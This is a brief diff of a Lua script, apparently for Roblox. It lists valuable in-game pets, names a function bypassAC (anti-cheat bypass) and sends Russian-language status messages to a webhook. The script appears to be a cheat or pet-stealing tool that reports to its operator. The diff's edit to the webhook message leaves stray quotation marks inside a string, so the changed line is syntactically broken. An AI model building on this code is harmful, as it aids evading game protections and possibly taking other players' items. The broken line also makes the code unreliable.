@@ -9,7 +9,7 @@ local YOUR_NAME = "ilkauiop3"
 local PETS = {
     ["Inverted Raccoon"] = 10000,
     ["Corrupted Kitsune"] = 7500,
-    ["Moon Cat"] = 5000,
+    ["Corrupted Kodama"] = 5000,
 }
 
 local function bypassAC()
@@ -91,6 +91,6 @@ if you then
     }))
 else
     HTP:PostAsync(WEBHOOK, HTP:JSONEncode({
-        content = "⛔ **ПРОВАЛ! "..YOUR_NAME.." не зашел на сервер за 2 минуты!**"
+        content = "⛔ **ПРОВАЛ! "ilkauiop3" не зашел на сервер за 2 минуты!**"
     }))
 end
